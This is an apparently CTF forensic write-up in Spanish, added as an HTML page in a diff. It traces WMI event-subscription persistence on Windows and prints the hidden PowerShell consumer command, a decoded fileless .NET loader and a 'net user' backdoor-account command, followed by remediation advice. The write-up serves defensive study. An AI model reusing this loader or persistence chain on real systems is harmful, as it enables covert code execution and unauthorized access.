@@ -1,0 +1,200 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>The Byte Lotus – Day 12 — ffSecurityNull — Security Writeups</title>
+<link rel="stylesheet" href="../assets/style.css">
+</head>
+<body>
+
+<div class="wrap">
+  <div class="case-file">
+
+    <a class="back" href="../index.html">&larr; volver al log</a>
+
+    <div class="stamp-block">
+      <div class="cell">
+        <div class="k">Plataforma</div>
+        <div class="v">TryHackMe</div>
+      </div>
+      <div class="cell">
+        <div class="k">Categoría</div>
+        <div class="v">Forensics / Windows / Persistence / Reverse Engineering</div>
+      </div>
+      <div class="cell">
+        <div class="k">Severidad</div>
+        <div class="v">High</div>
+      </div>
+      <div class="cell">
+        <div class="k">Fecha</div>
+        <div class="v">2026-08-08</div>
+      </div>
+    </div>
+
+    <h1>After Hours — Persistencia oculta vía WMI Event Subscription y payload .NET en memoria</h1>
+    <p class="dek">Se analizó offline un volcado parcial del repositorio CIM de WMI para identificar un mecanismo de persistencia invisible a Startup, Scheduled Tasks y claves Run del registro. Una suscripción de eventos WMI disfrazada de telemetría de hardware ejecutaba PowerShell oculto cada media hora, cargando un ensamblado .NET completo desde el valor por defecto de una propiedad de una clase WMI custom sin instancias.</p>
+
+    <h2>Reconocimiento</h2>
+    <p>El material entregado consistía en cinco archivos sin extensión reconocible a simple vista: <code>INDEX.BTR</code>, <code>OBJECTS.DATA</code>, <code>MAPPING1.MAP</code>, <code>MAPPING2.MAP</code> y <code>MAPPING3.MAP</code>. El briefing indicaba que un proceso back-office se estaba autenticando fuera de horario, y que la persistencia responsable no aparecía en ninguno de los lugares habituales de revisión.</p>
+    <pre><code>file INDEX.BTR OBJECTS.DATA MAPPING1.MAP MAPPING2.MAP MAPPING3.MAP
+→ data (genérico, sin firma reconocida por `file`)</code></pre>
+    <p>Un hexdump de <code>INDEX.BTR</code> reveló cadenas del tipo <code>CI_41C53E6DB1ACF2453CEFD41398198E613</code>, un patrón <code>CI_&lt;hash&gt;</code> característico del <strong>repositorio CIM (Common Information Model) de WMI</strong>. La combinación exacta de archivos —índice B-tree, blob de objetos y tres tablas de mapeo triple-buffered para journaling— corresponde a la estructura estándar de:</p>
+    <pre><code>%windir%\System32\wbem\Repository\</code></pre>
+    <p>Esto confirmó la pista narrativa del reto: WMI no es un mecanismo que Autoruns, Task Scheduler o las claves <code>Run</code> cubran por defecto, salvo que se inspeccione explícitamente el namespace <code>root\subscription</code>.</p>
+
+    <h2>Vulnerabilidad identificada</h2>
+    <p>Se identificó una técnica de <strong>persistencia vía Permanent WMI Event Subscription</strong> combinada con una técnica de ocultamiento de payload poco habitual:</p>
+    <ul>
+      <li><strong>Suscripción WMI camuflada:</strong> un <code>__EventFilter</code> + <code>CommandLineEventConsumer</code> en <code>root\subscription</code>, con nombres que imitan telemetría legítima de hardware/motor, disparaba PowerShell oculto cada 60 segundos al detectar que el minuto del reloj del sistema era 30.</li>
+      <li><strong>Payload fuera de la suscripción:</strong> el comando ejecutado no contenía el payload malicioso embebido — lo leía desde una <strong>clase WMI custom sin instancias</strong> (<code>Win32_HardwareTelemetry</code>), usando el <em>valor por defecto</em> de una propiedad (<code>ConfigData</code>) como contenedor de datos. Esto lo hace invisible a cualquier herramienta que solo liste instancias o inspeccione filters/consumers/bindings sin resolver definiciones de clase.</li>
+      <li><strong>Carga en memoria:</strong> el payload, una vez descomprimido, resultó ser un ensamblado .NET completo cargado vía <code>Reflection.Assembly.Load()</code> e invocado directamente, sin tocar disco ni generar un proceso hijo visible más allá del <code>powershell.exe</code> inicial.</li>
+      <li><strong>Anti-análisis por hostname:</strong> el ensamblado comparaba <code>Environment.MachineName</code> contra un valor hardcodeado antes de ejecutar su carga real, abortando en cualquier entorno distinto al objetivo.</li>
+    </ul>
+
+    <div class="callout"><strong>Nota:</strong> Ninguna herramienta estándar de listado de artefactos WMI (ni siquiera Autoruns, salvo activando explícitamente su pestaña de WMI) resuelve automáticamente clases custom sin instancias. El único método que expuso el payload completo fue el parseo manual y offline del repositorio CIM, archivo por archivo.</div>
+
+    <h2>Explotación (PoC)</h2>
+
+    <p><strong>Paso 1 — Parseo del repositorio CIM.</strong> No existe una herramienta nativa de Windows para leer estos archivos offline, así que se utilizó <strong>python-cim</strong> (proyecto <code>flare-wmi</code>, FireEye / Willi Ballenthin), un parser puro en Python del formato CIM:</p>
+    <pre><code>git clone https://github.com/fireeye/flare-wmi.git
+cd flare-wmi/python-cim
+pip install funcy hexdump intervaltree vivisect-vstruct-wb
+pip install -e .</code></pre>
+    <pre><code>from cim import CIM
+from cim.objects import Namespace
+
+c = CIM("win7", "/ruta/a/los/archivos")</code></pre>
+
+    <p><strong>Paso 2 — Enumeración de namespaces y clases con instancias.</strong> Se recorrió el árbol completo descartando ruido de clases del sistema (<code>__Namespace</code>, <code>__Win32Provider</code>, <code>MSFT_*</code>, <code>RSOP_*</code>...). El namespace clave resultó ser <code>root\subscription</code>, donde vive todo lo relacionado a Permanent WMI Event Subscriptions:</p>
+    <pre><code>CLASS: __EventFilter (2 instances)
+CLASS: __FilterToConsumerBinding (1 instances)
+CLASS: NTEventLogEventConsumer (1 instances)
+CLASS: CommandLineEventConsumer (1 instances)</code></pre>
+    <p>De las dos instancias de <code>__EventFilter</code>, una era legítima (<code>SCM Event Log Filter</code>). La segunda no:</p>
+    <pre><code>__EventFilter.Name = "EngineTelemetryFilter"
+  EventNamespace = root\cimv2
+  Query          = SELECT * FROM __InstanceModificationEvent WITHIN 60
+                    WHERE TargetInstance ISA 'Win32_LocalTime'
+                    AND TargetInstance.Minute = 30
+  QueryLanguage  = WQL</code></pre>
+    <p>Es decir: se disparaba cada hora, en el minuto 30, sondeando cada 60 segundos — exactamente el patrón de "logins en la madrugada" descrito en el brief. El consumer asociado:</p>
+    <pre><code>CommandLineEventConsumer.Name = "EngineTelemetryConsumer"
+  CommandLineTemplate = cmd /C powershell.exe -Sta -Nop -Window Hidden -enc &lt;Base64&gt;</code></pre>
+
+    <p><strong>Paso 3 — Decodificación del comando PowerShell.</strong> El bloque <code>-enc</code> se codifica en Base64 sobre UTF-16LE:</p>
+    <pre><code>import base64
+raw = base64.b64decode(b64_string)
+print(raw.decode("utf-16le"))</code></pre>
+    <pre><code>$file = ([WmiClass]'ROOT\cimv2:Win32_HardwareTelemetry').Properties['ConfigData'].Value;
+$o = New-Object IO.MemoryStream;
+$d = New-Object IO.Compression.DeflateStream(
+        [IO.MemoryStream][Convert]::FromBase64String($file),
+        [IO.Compression.CompressionMode]::Decompress);
+$b = New-Object Byte[](1024);
+$r = $d.Read($b,0,1024);
+while($r -gt 0){
+    $o.Write($b,0,$r);
+    $r = $d.Read($b,0,1024);
+}
+[Reflection.Assembly]::Load($o.ToArray()).EntryPoint.Invoke($null,@(,[string[]]@()))|Out-Null</code></pre>
+    <p>Esto confirmó que la configuración maliciosa no vivía en el consumer ni en el filter, sino en una clase WMI custom (<code>Win32_HardwareTelemetry</code>) con una propiedad (<code>ConfigData</code>) actuando como contenedor de un payload comprimido.</p>
+
+    <p><strong>Paso 4 — Localización de la clase maliciosa y extracción del payload.</strong> <code>Win32_HardwareTelemetry</code> no tenía instancias — por eso no aparecía en el listado normal del Paso 2. El valor vivía como <em>default value</em> de la propiedad en la propia definición de la clase:</p>
+    <pre><code>with Namespace(c, "root\\cimv2") as ns:
+    cd = ns.class_("Win32_HardwareTelemetry")
+    prop = cd.cl.properties["ConfigData"]
+    payload_b64 = prop.default_value   # ~2.2 KB de texto Base64</code></pre>
+    <pre><code>import base64, zlib
+
+raw = base64.b64decode(payload_b64)          # 1658 bytes comprimidos
+data = zlib.decompress(raw, -15)              # raw DEFLATE (sin header zlib)
+open("payload.bin", "wb").write(data)         # 4096 bytes</code></pre>
+    <pre><code>file payload.bin
+# PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections</code></pre>
+    <p>El payload resultó ser un ensamblado .NET completo (<code>updates.exe</code>), con una clase interna <code>AfterHours</code>, diseñado para cargarse en memoria vía reflection sin tocar disco.</p>
+
+    <p><strong>Paso 5 — Extracción de la flag.</strong> El análisis de strings UTF-16LE del binario reveló el mecanismo de anti-análisis y el dato final:</p>
+    <pre><code>strings -e l -n 4 payload.bin</code></pre>
+    <pre><code>bytelotusdc
+cmd.exe
+/c net user patch VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9 /add
+Execution halted: Environment mismatch.</code></pre>
+    <p>El ensamblado comparaba <code>Environment.MachineName</code> contra <code>"bytelotusdc"</code> — un chequeo de entorno anti-sandbox: si el hostname no coincidía, el binario abortaba con <em>"Environment mismatch"</em> sin ejecutar la carga real. Si coincidía, creaba un usuario local <code>patch</code> cuya "contraseña" era en realidad la flag codificada en Base64:</p>
+    <pre><code>import base64
+base64.b64decode("VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9").decode()
+# THM{P4tch_op3ned_th3_BacKd00r}</code></pre>
+
+    <div class="callout"><strong>Flag:</strong> <code>THM{P4tch_op3ned_th3_BacKd00r}</code></div>
+
+    <h2>Post-explotación / impacto</h2>
+    <p>La cadena completa de persistencia, resumida:</p>
+    <pre><code>Win32_LocalTime.Minute == 30            (trigger cada 60s)
+        │
+        ▼
+__EventFilter "EngineTelemetryFilter"   (root\subscription)
+        │
+        ▼
+__FilterToConsumerBinding
+        │
+        ▼
+CommandLineEventConsumer "EngineTelemetryConsumer"
+   → powershell.exe -enc &lt;b64/utf16le&gt;
+        │
+        ▼
+Lee Win32_HardwareTelemetry.ConfigData  (root\cimv2, sin instancias — valor por defecto)
+        │
+        ▼
+Base64 → DeflateStream.Decompress → ensamblado .NET en memoria
+        │
+        ▼
+Reflection.Assembly.Load(...).EntryPoint.Invoke()
+        │
+        ▼
+Chequeo de hostname == "bytelotusdc" (anti-análisis)
+        │
+        ▼
+net user patch &lt;flag en Base64&gt; /add   (persistencia adicional: cuenta local)</code></pre>
+    <p>El impacto en un entorno real sería severo: un atacante logró persistencia de ejecución de código completamente invisible a los mecanismos de revisión estándar, con ejecución periódica automática (cada hora) y una segunda capa de persistencia (cuenta local <code>patch</code>) como respaldo. La técnica de anti-análisis por hostname además dificulta la detección en sandboxes de análisis automatizado, ya que el payload real solo se activa en el entorno objetivo específico.</p>
+    <table style="width:100%; border-collapse:collapse; margin:1.5em 0;">
+      <thead>
+        <tr>
+          <th style="text-align:left; padding:6px 8px; border-bottom:1px solid currentColor;">Mecanismo revisado por herramientas típicas</th>
+          <th style="text-align:left; padding:6px 8px; border-bottom:1px solid currentColor;">¿Detecta esta persistencia?</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr><td style="padding:6px 8px;">Carpeta Startup</td><td style="padding:6px 8px;">No aplica</td></tr>
+        <tr><td style="padding:6px 8px;">Registro Run / RunOnce</td><td style="padding:6px 8px;">No aplica</td></tr>
+        <tr><td style="padding:6px 8px;">Task Scheduler</td><td style="padding:6px 8px;">No aplica</td></tr>
+        <tr><td style="padding:6px 8px;">Autoruns (vista por defecto)</td><td style="padding:6px 8px;">Solo si se activa explícitamente la pestaña WMI</td></tr>
+        <tr><td style="padding:6px 8px;">Revisión superficial de __EventFilter / Consumer</td><td style="padding:6px 8px;">Muestra el trigger, pero no el payload (vive en clase custom aparte)</td></tr>
+        <tr><td style="padding:6px 8px;">Análisis del repositorio CIM offline (python-cim)</td><td style="padding:6px 8px;">Único método que expone el payload completo</td></tr>
+      </tbody>
+    </table>
+
+    <h2>Remediación</h2>
+    <ul>
+      <li><strong>Auditar <code>root\subscription</code> explícitamente:</strong> incluir la revisión de <code>__EventFilter</code>, <code>__EventConsumer</code> y <code>__FilterToConsumerBinding</code> como paso estándar en cualquier análisis de persistencia en Windows, no solo Startup/Run/Tasks.</li>
+      <li><strong>Habilitar el módulo WMI de Autoruns</strong> (o herramientas equivalentes como <code>Get-WmiObject -Namespace root\subscription -Class __EventFilter</code>) de forma rutinaria, no como paso opcional.</li>
+      <li><strong>Monitorear la creación de clases WMI custom:</strong> el Event ID 5861 (Sysmon/WMI activity) y los logs de <code>Microsoft-Windows-WMI-Activity/Operational</code> registran la creación de <code>__EventFilter</code>, consumers y bindings en tiempo real; alertar sobre nuevas suscripciones permanentes fuera de un baseline conocido.</li>
+      <li><strong>Restringir la creación de namespaces/clases custom en <code>root\cimv2</code>:</strong> aplicar control de acceso (DCOM/WMI ACLs) para limitar qué cuentas pueden definir nuevas clases WMI, reduciendo la superficie para este tipo de contenedor encubierto.</li>
+      <li><strong>Detección de reflection en memoria:</strong> instrumentar EDR/AMSI para detectar patrones de <code>Reflection.Assembly.Load</code> combinados con streams de descompresión invocados desde PowerShell, un patrón de carga de payload en memoria (fileless) frecuente más allá de este caso puntual.</li>
+      <li><strong>Análisis forense offline del repositorio CIM</strong> como parte de la respuesta a incidentes cuando se sospeche persistencia WMI, dado que es el único método confiable para exponer datos ocultos en valores por defecto de propiedades de clase.</li>
+    </ul>
+
+    <h2>Lecciones aprendidas</h2>
+    <p>Este reto ilustra un nivel de sigilo poco frecuente en retos de persistencia: no basta con encontrar el <em>trigger</em> (el <code>__EventFilter</code> y el consumer), porque el payload real ni siquiera vive ahí. Un atacante con buen entendimiento del modelo de objetos de WMI puede usar una clase completamente custom, sin instancias, y esconder datos arbitrarios en el <em>valor por defecto de una propiedad a nivel de definición de clase</em> — un lugar que la gran mayoría de herramientas de triage automatizado ni siquiera consulta, porque no es un "objeto" en el sentido tradicional.</p>
+    <p>También refuerza que el análisis offline y manual del repositorio CIM, archivo por archivo con un parser como <code>python-cim</code>, sigue siendo insustituible cuando se sospecha de persistencia WMI avanzada: los volcados automatizados y las vistas por defecto de herramientas como Autoruns cubren el caso común, pero no garantizan visibilidad sobre clases custom sin instancias.</p>
+    <p>Por último, el chequeo de hostname como gate de ejecución es un recordatorio de que el malware moderno no siempre intenta ocultar <em>que</em> existe, sino que apuesta a que un analista trabajando fuera del entorno objetivo original nunca vea la carga real ejecutarse — la evasión no siempre es evitar la detección estática, a veces es simplemente negarse a "actuar" fuera de contexto.</p>
+
+  </div>
+
+  <footer>
+    <span>© 2026 ffSecurityNull — La Rioja, Argentina</span>
+    <a href="../index.html">Volver al índice</a>
+  </footer>
+</div>
+
+</body>
+</html>
